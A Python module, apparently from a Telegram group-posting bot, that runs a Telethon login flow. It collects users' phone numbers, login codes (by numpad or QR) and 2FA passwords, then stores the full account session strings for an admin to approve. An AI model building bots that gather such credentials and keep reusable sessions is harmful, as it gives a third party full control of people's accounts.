"""
Login va ro'yxatdan o'tish oqimi.

Ketma-ketlik:
1. Ism
2. Familiya
3. Telefon
4. Telegram tasdiq kodi (numpad) yoki QR Login
5. 2FA (bo'lsa)
6. Sessiya yaratiladi -> adminga xabar
"""

from __future__ import annotations

import asyncio
import contextlib
import time
from dataclasses import dataclass
from io import BytesIO

import qrcode
from telethon import TelegramClient
from telethon.errors import (
    ApiIdInvalidError,
    AuthRestartError,
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeExpiredError,
    PhoneCodeInvalidError,
    PhoneNumberBannedError,
    PhoneNumberFloodError,
    PhoneNumberInvalidError,
    SendCodeUnavailableError,
    SessionPasswordNeededError,
)
from telethon.sessions import StringSession
from telegram import Update

from bot import keyboards as KB
from bot import texts as T
from config.config import (
    API_HASH,
    API_ID,
    CODE_LENGTH,
    MAX_WRONG_CODE,
    SMS_COOLDOWN_MIN,
    SMS_MAX_ATTEMPTS,
    SUPER_ADMIN,
)
from core import database as db
from core.logger import log
from core.utils import is_valid_name, is_valid_phone


# ─────────────────────────────────────────────────────────────────────────
# GLOBAL HOLAT
# ─────────────────────────────────────────────────────────────────────────
@dataclass
class LoginCtx:
    """Login jarayoni uchun ma'lumot."""
    client: TelegramClient
    phone: str
    phone_code_hash: str
    started_at: float
    wrong_count: int = 0
    resend_count: int = 0
    for_uid: int | None = None
    target_name: str = ""
    mode: str = "code"
    wait_task: asyncio.Task | None = None
    qr_message_id: int | None = None


user_states: dict[int, dict] = {}
login_ctx: dict[int, LoginCtx] = {}
sms_attempts: dict[int, list[float]] = {}

application = None


def set_application(app) -> None:
    """main.py dan chaqiriladi."""
    global application
    application = app


def mask_phone(phone: str) -> str:
    """Telefon raqamini log uchun xavfsiz ko'rinishga keltiradi."""
    if len(phone) <= 6:
        return "***"
    return f"{phone[:4]}***{phone[-3:]}"


def describe_code_delivery(result) -> tuple[str, str, str, int | None]:
    """
    Telegramning ``auth.SentCode`` javobini odam o'qiydigan ko'rinishga
    aylantiradi. Telegram so'rovni qabul qilgani kod haqiqatan yetib
    borganini kafolatlamaydi, shuning uchun texnik turi ham loglanadi.
    """
    result_name = type(result).__name__
    code_type = getattr(result, "type", None)
    type_name = type(code_type).__name__ if code_type is not None else result_name

    if type_name == "SentCodeTypeApp":
        destination = "Telegram ilovasidagi rasmiy «Telegram» (777000) chati"
    elif type_name in ("SentCodeTypeSms", "SentCodeTypeFirebaseSms"):
        destination = "SMS xabari"
    elif type_name == "SentCodeTypeEmailCode":
        pattern = getattr(code_type, "email_pattern", "")
        destination = f"login e-pochtasi ({pattern})" if pattern else "login e-pochtasi"
    elif type_name == "SentCodeTypeCall":
        destination = "avtomatik telefon qo'ng'irog'i"
    elif type_name in ("SentCodeTypeFlashCall", "SentCodeTypeMissedCall"):
        destination = "Telegram ko'rsatgan telefon qo'ng'irog'i"
    elif type_name == "SentCodeTypeFragmentSms":
        destination = "Fragment orqali xabar"
    elif type_name in ("SentCodeTypeSmsPhrase", "SentCodeTypeSmsWord"):
        destination = "SMS ichidagi so'z/ibora"
    elif type_name == "SentCodeTypeSetUpEmailRequired":
        destination = "avval rasmiy Telegram ilovasida login e-pochtasini sozlash"
    elif result_name == "SentCodePaymentRequired":
        destination = "Telegram tasdiq kodi uchun to'lov talab qildi"
    elif result_name == "SentCodeSuccess":
        destination = "Telegram sessiyani darhol tasdiqladi"
    else:
        destination = f"Telegram belgilagan usul ({type_name})"

    next_type = getattr(result, "next_type", None)
    next_name = type(next_type).__name__ if next_type is not None else "yo'q"
    timeout = getattr(result, "timeout", None)
    return destination, type_name, next_name, timeout


def make_qr_image(url: str) -> BytesIO:
    """Telegram login URL uchun PNG QR rasm yaratadi."""
    qr = qrcode.QRCode(version=None, box_size=8, border=4)
    qr.add_data(url)
    qr.make(fit=True)
    image = qr.make_image(fill_color="black", back_color="white")

    output = BytesIO()
    output.name = "telegram-login.png"
    image.save(output, format="PNG")
    output.seek(0)
    return output


async def _delete_qr_message(uid: int, ctx: LoginCtx) -> None:
    """Muddati tugagan yoki ishlatilgan QR tokenli xabarni o'chiradi."""
    message_id = ctx.qr_message_id
    ctx.qr_message_id = None
    if message_id and application:
        with contextlib.suppress(Exception):
            await application.bot.delete_message(chat_id=uid, message_id=message_id)


async def _validate_qr_account(uid: int, ctx: LoginCtx) -> bool:
    """QR orqali aynan bot bilan gaplashayotgan Telegram user kirganini tekshiradi."""
    me = await ctx.client.get_me()
    if not me or int(me.id) != int(uid):
        return False

    actual_phone = (getattr(me, "phone", "") or "").strip()
    if actual_phone:
        ctx.phone = "+" + actual_phone.lstrip("+")
        await db.set_phone(uid, ctx.phone)
    return True


# ─────────────────────────────────────────────────────────────────────────
# TOZALASH
# ─────────────────────────────────────────────────────────────────────────
async def cleanup_login(uid: int) -> None:
    """Foydalanuvchi login holati, QR taski va clientini tozalash."""
    ctx = login_ctx.pop(uid, None)
    if ctx:
        task = ctx.wait_task
        if task and task is not asyncio.current_task() and not task.done():
            task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await task
        await _delete_qr_message(uid, ctx)
        with contextlib.suppress(Exception):
            await ctx.client.disconnect()
    user_states.pop(uid, None)
  

# ─────────────────────────────────────────────────────────────────────────
# SMS QAYTA SO'RASH LIMITI
# ─────────────────────────────────────────────────────────────────────────
def can_resend_sms(uid: int) -> tuple[bool, int]:
    """Foydalanuvchi yana SMS so'rashi mumkinmi?"""
    now = time.time()
    window = SMS_COOLDOWN_MIN * 60
    attempts = [t for t in sms_attempts.get(uid, []) if t >= now - window]

    if len(attempts) >= SMS_MAX_ATTEMPTS:
        oldest = min(attempts)
        wait_s = (oldest + window) - now
        wait_min = max(1, int(wait_s // 60) + (1 if wait_s % 60 else 0))
        return False, wait_min

    attempts.append(now)
    sms_attempts[uid] = attempts
    return True, 0


def reset_sms_attempts(uid: int) -> None:
    sms_attempts.pop(uid, None)


# ─────────────────────────────────────────────────────────────────────────
# NUMPAD YUBORISH / YANGILASH
# ─────────────────────────────────────────────────────────────────────────
async def send_numpad(uid: int, buffer: str = "", hint: str = "") -> None:
    """Telegram tasdiq kodi oynasini yuboradi yoki yangilaydi."""
    state = user_states.get(uid, {})
    if not hint:
        hint = state.get("code_hint", "")
    text = T.numpad_text(buffer, hint)
    msg_id = state.get("numpad_msg_id")

    if msg_id:
        try:
            await application.bot.edit_message_text(
                chat_id=uid,
                message_id=msg_id,
                text=text,
                reply_markup=KB.kb_numpad(),
            )
            state["ts"] = time.time()
            user_states[uid] = state
            return
        except Exception:
            pass

    msg = await application.bot.send_message(
        uid, text, reply_markup=KB.kb_numpad()
    )
    state["numpad_msg_id"] = msg.message_id
    state["ts"] = time.time()
    user_states[uid] = state


# ─────────────────────────────────────────────────────────────────────────
# KOD SO'RASH
# ─────────────────────────────────────────────────────────────────────────
async def request_code(
    uid: int,
    phone: str,
    for_uid: int | None = None,
    target_name: str = "",
) -> None:
    """Telegramga kod so'rovini yuboradi va yetkazish turini ko'rsatadi."""
    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=20)
        result = await asyncio.wait_for(
            client.send_code_request(phone), timeout=30
        )

        destination, type_name, next_name, delivery_timeout = (
            describe_code_delivery(result)
        )
        phone_code_hash = getattr(result, "phone_code_hash", "") or ""

        login_ctx[uid] = LoginCtx(
            client=client,
            phone=phone,
            phone_code_hash=phone_code_hash,
            started_at=time.time(),
            for_uid=for_uid,
            target_name=target_name,
        )

        # Yangi Telegram qatlamlari ayrim holatda sessiyani kodsiz tasdiqlashi
        # mumkin. Bunday javobda phone_code_hash bo'lmaydi.
        if type(result).__name__ == "SentCodeSuccess" or (
            not phone_code_hash and await client.is_user_authorized()
        ):
            log(
                f"✅ Kod talab qilinmadi: uid={uid} "
                f"phone={mask_phone(phone)} type={type_name}"
            )
            await finalize_login(uid)
            return

        if not phone_code_hash:
            raise RuntimeError(
                f"Telegram {type_name} qaytardi, phone_code_hash yo'q"
            )

        code_length = getattr(getattr(result, "type", None), "length", None)
        delivery_hint = T.code_hint_sent(destination)
        user_states[uid] = {
            "step": "code",
            "ts": time.time(),
            "code_buffer": "",
            "code_length": code_length or CODE_LENGTH,
            "code_hint": delivery_hint,
        }
        await send_numpad(uid, "", hint=delivery_hint)
        log(
            f"📩 Kod so'rovi qabul qilindi: uid={uid} "
            f"phone={mask_phone(phone)} delivery={type_name} "
            f"next={next_name} timeout={delivery_timeout}"
        )

    except PhoneNumberInvalidError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code: uid={uid} PhoneNumberInvalidError: {e}", "warning")
        await application.bot.send_message(uid, T.PHONE_INVALID)

    except PhoneNumberBannedError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code: uid={uid} PhoneNumberBannedError: {e}", "warning")
        await application.bot.send_message(uid, "🚫 Bu raqam Telegram tomonidan bloklangan.")

    except ApiIdInvalidError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code: ApiIdInvalidError: {e}", "error")
        await application.bot.send_message(uid, T.API_CREDENTIALS_INVALID)

    except (PhoneNumberFloodError, SendCodeUnavailableError, AuthRestartError) as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code: uid={uid} {type(e).__name__}: {e}", "warning")
        await application.bot.send_message(
            uid, T.CODE_UNAVAILABLE, reply_markup=KB.kb_login()
        )

    except FloodWaitError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        wait_min = max(1, (e.seconds + 59) // 60)
        log(f"request_code: uid={uid} FloodWait={e.seconds}s", "warning")
        await application.bot.send_message(
            uid, T.FLOOD_WAIT.format(minutes=wait_min), reply_markup=KB.kb_login()
        )

    except asyncio.TimeoutError:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code: uid={uid} Telegram ulanish timeout", "error")
        await application.bot.send_message(
            uid,
            "❌ VPS Telegram MTProto serveriga vaqtida ulana olmadi. "
            "AWS Security Group/NAT va chiqish tarmog'ini tekshiring.",
            reply_markup=KB.kb_login(),
        )

    except Exception as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"request_code xatolik {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(
            uid, T.GENERIC_ERROR, reply_markup=KB.kb_login()
        )
      

# ─────────────────────────────────────────────────────────────────────────
# QR LOGIN — AWS/VPSDA KOD YETIB KELMAGANDA
# ─────────────────────────────────────────────────────────────────────────
async def begin_qr_login(uid: int) -> None:
    """Mavjud kod loginini bekor qilib, bir martalik QR login yaratadi."""
    old_ctx = login_ctx.get(uid)
    state = user_states.get(uid, {})
    if not old_ctx or state.get("step") != "code":
        await application.bot.send_message(
            uid,
            "⚠️ Avval 🔑 Login bosib, telefon raqamingizni kiriting.",
            reply_markup=KB.kb_login(),
        )
        return

    # Admin boshqa user nomidan ochayotgan sessiyada QRni adminning o'zi
    # skanerlashi noto'g'ri akkauntni ulab qo'yishi mumkin.
    if old_ctx.for_uid is not None:
        await application.bot.send_message(
            uid, "⚠️ QR Login faqat foydalanuvchining o'zi kirishi uchun."
        )
        return

    phone = old_ctx.phone
    await cleanup_login(uid)

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await asyncio.wait_for(client.connect(), timeout=20)
        qr_login = await asyncio.wait_for(client.qr_login(), timeout=20)

        ctx = LoginCtx(
            client=client,
            phone=phone,
            phone_code_hash="",
            started_at=time.time(),
            mode="qr",
        )
        login_ctx[uid] = ctx
        user_states[uid] = {"step": "qr", "ts": time.time()}

        image = make_qr_image(qr_login.url)
        message = await application.bot.send_photo(
            chat_id=uid,
            photo=image,
            caption=T.QR_CAPTION,
            reply_markup=KB.kb_qr_login(qr_login.url),
        )
        ctx.qr_message_id = message.message_id
        ctx.wait_task = asyncio.create_task(
            _wait_for_qr_login(uid, ctx, qr_login),
            name=f"qr-login-{uid}",
        )
        log(f"📷 QR Login yaratildi: uid={uid} phone={mask_phone(phone)}")

    except ApiIdInvalidError as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"qr_login: ApiIdInvalidError: {e}", "error")
        await application.bot.send_message(
            uid, T.API_CREDENTIALS_INVALID, reply_markup=KB.kb_login()
        )
    except Exception as e:
        with contextlib.suppress(Exception):
            await client.disconnect()
        await cleanup_login(uid)
        log(f"qr_login yaratish xatosi {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(
            uid, T.QR_ERROR, reply_markup=KB.kb_login()
        )


async def _wait_for_qr_login(uid: int, ctx: LoginCtx, qr_login) -> None:
    """QR token skanerlanishini kutadi va o'sha user sessiyasini yakunlaydi."""
    try:
        await qr_login.wait()

        if not await _validate_qr_account(uid, ctx):
            log(f"🚫 QR boshqa akkaunt bilan tasdiqlandi: uid={uid}", "warning")
            await cleanup_login(uid)
            await application.bot.send_message(
                uid, T.QR_WRONG_ACCOUNT, reply_markup=KB.kb_login()
            )
            return

        await _delete_qr_message(uid, ctx)
        log(f"✅ QR tasdiqlandi: uid={uid}")
        await finalize_login(uid)

    except SessionPasswordNeededError:
        await _delete_qr_message(uid, ctx)
        if login_ctx.get(uid) is not ctx:
            return
        ctx.wait_task = None
        user_states[uid] = {"step": "password", "ts": time.time()}
        await application.bot.send_message(uid, T.ASK_PASSWORD)

    except (asyncio.TimeoutError, TimeoutError):
        if login_ctx.get(uid) is not ctx:
            return
        ctx.wait_task = None
        await cleanup_login(uid)
        log(f"⏰ QR Login muddati tugadi: uid={uid}", "warning")
        await application.bot.send_message(
            uid, T.QR_EXPIRED, reply_markup=KB.kb_login()
        )

    except asyncio.CancelledError:
        raise

    except Exception as e:
        if login_ctx.get(uid) is ctx:
            ctx.wait_task = None
            await cleanup_login(uid)
        log(f"qr_login kutish xatosi {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(
            uid, T.QR_ERROR, reply_markup=KB.kb_login()
        )

    finally:
        if login_ctx.get(uid) is ctx and ctx.wait_task is asyncio.current_task():
            ctx.wait_task = None


async def handle_qr_waiting(update: Update) -> None:
    """QR kutilayotganda yozilgan oddiy xabarga yo'l-yo'riq beradi."""
    state = user_states.get(update.effective_user.id, {})
    state["ts"] = time.time()
    user_states[update.effective_user.id] = state
    await update.message.reply_text(T.QR_WAITING)


# ─────────────────────────────────────────────────────────────────────────
# LOGINNI BOSHLASH
# ─────────────────────────────────────────────────────────────────────────
async def begin_login(update: Update) -> None:
    """🔑 Login tugmasi bosilganda."""
    uid = update.effective_user.id
    await cleanup_login(uid)

    if await db.is_blocked(uid):
        await update.message.reply_text(T.BLOCKED, reply_markup=KB.kb_blocked())
        return

    user = await db.get_user(uid)

    if user and user.get("awaiting_approval"):
        await update.message.reply_text(
            T.LOGIN_ALREADY_PENDING, reply_markup=KB.kb_pending()
        )
        return

    # Ishlayotgan 4x40in-bot oqimi: yangi/tasdiqlanmagan user avval
    # ro'yxatdan o'tadi, lekin Telegram kodi HALI so'ralmaydi.
    if not user or not user.get("is_admin"):
        user_states[uid] = {"step": "name", "ts": time.time()}
        await update.message.reply_text(T.ASK_NAME)
        return

    phone = user.get("phone")
    if not phone:
        user_states[uid] = {"step": "phone", "ts": time.time()}
        await update.message.reply_text(
            "📱 Telefon raqamingizni yuboring:\n\nFormat: +998XXXXXXXXX"
        )
        return

    await update.message.reply_text(T.PHONE_ACCEPTED.format(phone=phone))
    await request_code(uid, phone)


# ─────────────────────────────────────────────────────────────────────────
# ISM
# ─────────────────────────────────────────────────────────────────────────
async def handle_name(update: Update, text: str) -> None:
    uid = update.effective_user.id
    name = text.strip()

    if not is_valid_name(name):
        await update.message.reply_text(T.NAME_TOO_SHORT)
        return

    name = name[:64]
    user_states[uid] = {
        "step": "surname",
        "ts": time.time(),
        "name": name,
    }
    await update.message.reply_text(T.NAME_ACCEPTED.format(name=name))


# ─────────────────────────────────────────────────────────────────────────
# FAMILIYA
# ─────────────────────────────────────────────────────────────────────────
async def handle_surname(update: Update, text: str) -> None:
    uid = update.effective_user.id
    surname = text.strip()

    if not is_valid_name(surname):
        await update.message.reply_text(T.SURNAME_TOO_SHORT)
        return

    state = user_states.get(uid, {})
    name = state.get("name", "")
    full_name = f"{name} {surname}"[:64]

    state["step"] = "phone"
    state["full_name"] = full_name
    state["ts"] = time.time()
    user_states[uid] = state

    await update.message.reply_text(
        T.SURNAME_ACCEPTED.format(full_name=full_name)
    )


# ─────────────────────────────────────────────────────────────────────────
# TELEFON
# ─────────────────────────────────────────────────────────────────────────
async def handle_phone(update: Update, text: str) -> None:
    """Foydalanuvchi telefon raqamni kiritadi."""
    uid = update.effective_user.id
    phone = text.strip().replace(" ", "").replace("-", "")

    if not is_valid_phone(phone):
        await update.message.reply_text(T.PHONE_INVALID)
        return

    await db.set_phone(uid, phone)

    state = user_states.get(uid, {})
    full_name = state.get("full_name", "")
    if full_name:
        await db.set_user_info(
            uid, full_name, update.effective_user.username or ""
        )

    user_states.pop(uid, None)

    # Faqat avvaldan tasdiqlangan user uchun kod so'raymiz. Bu ochiq botda
    # istalgan odam AWS IP/API_ID orqali auth.sendCode spam qilishini to'xtatadi.
    if uid == SUPER_ADMIN or await db.is_admin(uid):
        await update.message.reply_text(T.PHONE_ACCEPTED.format(phone=phone))
        await request_code(uid, phone)
        return

    await db.set_awaiting_approval(uid, True)
    log(f"⏳ Ro'yxatdan o'tish so'rovi: uid={uid} phone={mask_phone(phone)}")
    await notify_super_for_approval(uid)
    await update.message.reply_text(
        T.REGISTRATION_PENDING,
        reply_markup=KB.kb_pending(),
    )
  

# ─────────────────────────────────────────────────────────────────────────
# TELEGRAM TASDIQ KODINI TEKSHIRISH
# ─────────────────────────────────────────────────────────────────────────
async def attempt_signin(uid: int, code: str) -> None:
    """Tasdiq kodini Telegramga yuborib tekshiradi."""
    ctx = login_ctx.get(uid)
    if not ctx:
        await cleanup_login(uid)
        await application.bot.send_message(
            uid,
            "❌ Login jarayoni buzildi. Qaytadan 🔑 Login bosing.",
            reply_markup=KB.kb_login(),
        )
        return

    try:
        if not ctx.client.is_connected():
            await asyncio.wait_for(ctx.client.connect(), timeout=20)

        await ctx.client.sign_in(
            phone=ctx.phone,
            code=code,
            phone_code_hash=ctx.phone_code_hash,
        )
        await finalize_login(uid)

    except SessionPasswordNeededError:
        old_msg = user_states.get(uid, {}).get("numpad_msg_id")
        if old_msg:
            with contextlib.suppress(Exception):
                await application.bot.delete_message(
                    chat_id=uid, message_id=old_msg
                )

        user_states[uid] = {"step": "password", "ts": time.time()}
        await application.bot.send_message(uid, T.ASK_PASSWORD)

    except PhoneCodeInvalidError:
        ctx.wrong_count += 1

        if ctx.wrong_count >= MAX_WRONG_CODE:
            await cleanup_login(uid)
            await application.bot.send_message(
                uid,
                T.CODE_MAX_WRONG.format(count=ctx.wrong_count),
                reply_markup=KB.kb_login(),
            )
            return

        state = user_states.get(uid, {})
        state["code_buffer"] = ""
        state["ts"] = time.time()
        user_states[uid] = state

        await send_numpad(
            uid,
            "",
            hint=T.CODE_HINT_WRONG.format(
                count=ctx.wrong_count, max=MAX_WRONG_CODE
            ),
        )

    except PhoneCodeExpiredError:
        allowed, wait_min = can_resend_sms(uid)
        if not allowed:
            await cleanup_login(uid)
            await application.bot.send_message(
                uid,
                T.SMS_LIMIT_REACHED.format(
                    attempts=SMS_MAX_ATTEMPTS, minutes=wait_min
                ),
                reply_markup=KB.kb_login(),
            )
            return

        try:
            result = await asyncio.wait_for(
                ctx.client.send_code_request(ctx.phone), timeout=30
            )
            destination, type_name, next_name, delivery_timeout = (
                describe_code_delivery(result)
            )
            ctx.phone_code_hash = result.phone_code_hash
            ctx.wrong_count = 0

            state = user_states.get(uid, {})
            state["code_buffer"] = ""
            state["code_length"] = (
                getattr(getattr(result, "type", None), "length", None)
                or CODE_LENGTH
            )
            state["code_hint"] = T.code_hint_sent(destination)
            state["ts"] = time.time()
            user_states[uid] = state

            await send_numpad(uid, "", hint=state["code_hint"])
            log(
                f"🔁 Kod qayta so'raldi: uid={uid} delivery={type_name} "
                f"next={next_name} timeout={delivery_timeout}"
            )

        except FloodWaitError as e:
            await cleanup_login(uid)
            wait_min = max(1, e.seconds // 60)
            await application.bot.send_message(
                uid,
                T.FLOOD_WAIT.format(minutes=wait_min),
                reply_markup=KB.kb_login(),
            )
        except Exception as e:
            await cleanup_login(uid)
            log(f"resend xatolik {uid}: {type(e).__name__}: {e}", "error")
            await application.bot.send_message(
                uid, T.GENERIC_ERROR, reply_markup=KB.kb_login()
            )

    except FloodWaitError as e:
        await cleanup_login(uid)
        wait_min = max(1, e.seconds // 60)
        await application.bot.send_message(
            uid,
            T.FLOOD_WAIT.format(minutes=wait_min),
            reply_markup=KB.kb_login(),
        )

    except Exception as e:
        await cleanup_login(uid)
        log(f"sign_in xatolik {uid}: {type(e).__name__}: {e}", "error")
        await application.bot.send_message(
            uid, T.GENERIC_ERROR, reply_markup=KB.kb_login()
        )


# ─────────────────────────────────────────────────────────────────────────
# 2FA PAROL
# ─────────────────────────────────────────────────────────────────────────
async def handle_password(update: Update, text: str) -> None:
    """2FA parolni qabul qilish."""
    uid = update.effective_user.id
    ctx = login_ctx.get(uid)

    if not ctx:
        await cleanup_login(uid)
        await update.message.reply_text(
            "❌ Jarayon buzildi. Qaytadan 🔑 Login bosing.",
            reply_markup=KB.kb_login(),
        )
        return

    try:
        if not ctx.client.is_connected():
            await asyncio.wait_for(ctx.client.connect(), timeout=20)

        await ctx.client.sign_in(password=text)
        if ctx.mode == "qr" and not await _validate_qr_account(uid, ctx):
            log(f"🚫 QR 2FA boshqa akkaunt bilan tasdiqlandi: uid={uid}", "warning")
            await cleanup_login(uid)
            await update.message.reply_text(
                T.QR_WRONG_ACCOUNT, reply_markup=KB.kb_login()
            )
            return
        await finalize_login(uid)

    except PasswordHashInvalidError:
        await update.message.reply_text(T.PASSWORD_WRONG)

    except FloodWaitError as e:
        await cleanup_login(uid)
        wait_min = max(1, e.seconds // 60)
        await update.message.reply_text(
            T.FLOOD_WAIT.format(minutes=wait_min),
            reply_markup=KB.kb_login(),
        )

    except Exception as e:
        await cleanup_login(uid)
        log(f"password xatolik {uid}: {type(e).__name__}: {e}", "error")
        await update.message.reply_text(
            T.GENERIC_ERROR, reply_markup=KB.kb_login()
        )
      

# ─────────────────────────────────────────────────────────────────────────
# LOGIN YAKUNI
# ─────────────────────────────────────────────────────────────────────────
async def finalize_login(uid: int) -> None:
    """
    Login tugaganda sessiyani saqlash.

    Muhim: admin boshqa user uchun sessiya ochsa — user ADMIN QILINMAYDI.
    """
    ctx = login_ctx.get(uid)
    if not ctx:
        return

    sess_str = ctx.client.session.save()
    with contextlib.suppress(Exception):
        await ctx.client.disconnect()

    for_uid = ctx.for_uid
    target_name = ctx.target_name
    phone = ctx.phone

    login_ctx.pop(uid, None)
    user_states.pop(uid, None)
    reset_sms_attempts(uid)

    # ── 1) ADMIN boshqa foydalanuvchi uchun sessiya ochgan ──
    if for_uid is not None:
        await db.set_session(for_uid, sess_str)
        await db.set_awaiting_approval(for_uid, False)
        # add_admin CHAQIRILMAYDI!

        log(f"✅ Admin {uid} → user {for_uid} sessiyasini ochdi")

        await application.bot.send_message(
            uid,
            f"✅ Foydalanuvchi sessiyasi ochildi.\n\n"
            f"👤 {target_name or 'Noma`lum'}\n"
            f"📱 {phone}\n"
            f"🆔 {for_uid}",
            reply_markup=KB.kb_main(super_admin=True),
        )

        with contextlib.suppress(Exception):
            await application.bot.send_message(
                for_uid,
                "✅ Admin sizning hisobingizni faollashtirdi!\n\n"
                "Endi botdan foydalanishingiz mumkin. 🔑 Login bosing.",
            )
        return

    # ── 2) SUPER ADMIN o'zi ──
    if uid == SUPER_ADMIN:
        await db.set_session(uid, sess_str)
        await db.set_awaiting_approval(uid, False)
        await db.add_admin(uid)
        log(f"✅ Super admin kirdi: {uid}")

        await application.bot.send_message(
            uid,
            "✅ Super admin sifatida kirdingiz!",
            reply_markup=KB.kb_main(super_admin=True),
        )
        return

    # ── 3) Tasdiqlangan oddiy foydalanuvchi ──
    if await db.is_admin(uid):
        await db.set_session(uid, sess_str)
        await db.set_awaiting_approval(uid, False)

        info = await db.get_user_info(uid)
        name = info.get("name") or "Foydalanuvchi"

        log(f"✅ Tasdiqlangan user kirdi: {uid}")
        await application.bot.send_message(
            uid,
            f"✅ {name}, tizimga muvaffaqiyatli kirdingiz!\n\n"
            "Endi guruh va post qo'shib, ▶️ Start bosishingiz mumkin.",
            reply_markup=KB.kb_main(),
        )
        return

    # ── 4) Yangi foydalanuvchi (tasdiqlanmagan) ──
    await db.set_pending(uid, sess_str)
    await db.set_awaiting_approval(uid, True)

    log(f"⏳ Tasdiq kutilmoqda: {uid}")
    await notify_super_for_approval(uid)

    await application.bot.send_message(
        uid,
        T.LOGIN_SUCCESS_PENDING,
        reply_markup=KB.kb_pending(),
    )


# ─────────────────────────────────────────────────────────────────────────
# ADMINGA XABAR
# ─────────────────────────────────────────────────────────────────────────
async def notify_super_for_approval(uid: int) -> None:
    """Super adminga yangi foydalanuvchi haqida xabar."""
    info = await db.get_user_info(uid)
    name = info.get("name") or "Noma`lum"
    username = info.get("username") or ""
    phone = await db.get_phone(uid) or "—"

    text = T.new_user_notification(name, phone, username, uid)
    kb = KB.kb_admin_approve(uid)

    with contextlib.suppress(Exception):
        await application.bot.send_message(SUPER_ADMIN, text, reply_markup=kb)


# ─────────────────────────────────────────────────────────────────────────
# KODNI MATN SIFATIDA YUBORSA
# ─────────────────────────────────────────────────────────────────────────
async def handle_code(update: Update, text: str) -> None:
    """Kodni matn sifatida yozsa — ogohlantiramiz."""
    uid = update.effective_user.id
    await update.message.reply_text(T.CODE_NOT_MATN)

    state = user_states.get(uid, {})
    state.setdefault("code_buffer", "")
    state["ts"] = time.time()
    user_states[uid] = state

    await send_numpad(uid, state["code_buffer"])


# ─────────────────────────────────────────────────────────────────────────
# YORDAMCHI
# ─────────────────────────────────────────────────────────────────────────
def is_in_login(uid: int) -> bool:
    """Foydalanuvchi login jarayonidami?"""
    state = user_states.get(uid)
    if not state:
        return False
    return state.get("step") in (
        "name", "surname", "phone", "code", "qr", "password"
    )


def get_step(uid: int) -> str | None:
    """Hozirgi login qadamini qaytaradi."""
    state = user_states.get(uid, {})
    return state.get("step")
